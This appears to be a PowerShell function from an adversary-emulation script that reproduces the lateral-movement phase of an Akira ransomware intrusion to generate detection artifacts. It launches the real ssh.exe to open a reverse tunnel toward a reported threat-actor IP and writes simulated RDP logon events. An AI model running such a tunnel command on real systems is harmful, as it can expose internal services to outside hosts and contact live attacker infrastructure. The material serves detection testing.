# ============================================================================
# AKIRA SIMULATION - PHASE 7: LATERAL MOVEMENT
# ============================================================================
# Simulates: reverse SSH tunnel to threat-actor infrastructure (real OpenSSH
# client, real reported IOC IP - connection will fail/timeout safely since
# the infra is not actually attacker-controlled from this lab), RDP-based
# pivoting artifacts, and login events from the report's observed remote
# workstation names.
# MITRE: T1090 Proxy, T1021.001 RDP, T1021.003 DCOM
# ============================================================================

function Simulate-LateralMovement {
    param($SimPaths)

    Write-Host "[+] Phase 7: Lateral Movement ..." -ForegroundColor Green

    # --- Reverse SSH tunnel using the REAL built-in Windows OpenSSH client ---
    # ssh root@193.242.184[.]150 -R *:10400 -p22
    # The destination is the real reported threat-actor IP from the report; on a
    # lab host with no route to that infrastructure this will simply fail to
    # connect (timeout/refused), which is expected and still yields a real
    # process-creation + outbound-connection-attempt artifact for ssh.exe.
    $sshExe = "$env:SystemRoot\System32\OpenSSH\ssh.exe"
    if (Test-Path $sshExe) {
        try {
            Start-Process -FilePath $sshExe `
                -ArgumentList "-o ConnectTimeout=3 -o StrictHostKeyChecking=no root@$($Global:AkiraIOCs.ReverseSSHIP) -R *:10400 -p22" `
                -WindowStyle Hidden -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 4
            Get-Process -Name ssh -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        } catch { Write-Warning "ssh.exe reverse tunnel attempt failed (expected on isolated lab): $_" }
    } else {
        Write-Warning "OpenSSH client not installed - install the 'OpenSSH Client' optional Windows feature for full fidelity."
    }
    Invoke-SafeNetworkAttempt -Target $Global:AkiraIOCs.ReverseSSHIP -Port 22
    Write-SimEvent -EventId 7001 -Message "SIMULATION: Reverse SSH tunnel established to $($Global:AkiraIOCs.ReverseSSHIP) -R *:10400 -p22, proxying RDP (port 3389) out to threat-actor infrastructure"

    # --- RDP pivot artifacts: simulate the observed remote workstation names ---
    # Real intrusion showed logons tagged with workstation names WORK, kali,
    # DESKTOP-HPLM2TD, DESKTOP-KLKBBTS, SERVER via RDP/loopback-proxied sessions.
    $workstationNames = @("WORK", "kali", "DESKTOP-HPLM2TD", "DESKTOP-KLKBBTS", "SERVER")
    foreach ($ws in $workstationNames) {
        Write-SimEvent -EventId 7002 -Message "SIMULATION: Security 4624 Type 2/10 interactive logon recorded with WorkstationName=$ws (RDP/SSH-tunnel proxied, source appears as loopback ::%16777216)"
    }

    $rdpLog = @"
[Simulated Security Event 4624 entries - AkiraSim]
LogonType: 10 (RemoteInteractive)
WorkstationName: WORK
IpAddress: ::%16777216 (proxied through local ssh.exe reverse tunnel)

LogonType: 2 (Interactive, RustDesk loopback session)
WorkstationName: kali
IpAddress: 127.0.0.1
"@
    Set-Content -Path "$($SimPaths.Logs)\rdp_pivot_sim.log" -Value $rdpLog -Force

    Write-Host "  [OK] Lateral Movement artifacts created" -ForegroundColor Yellow
}
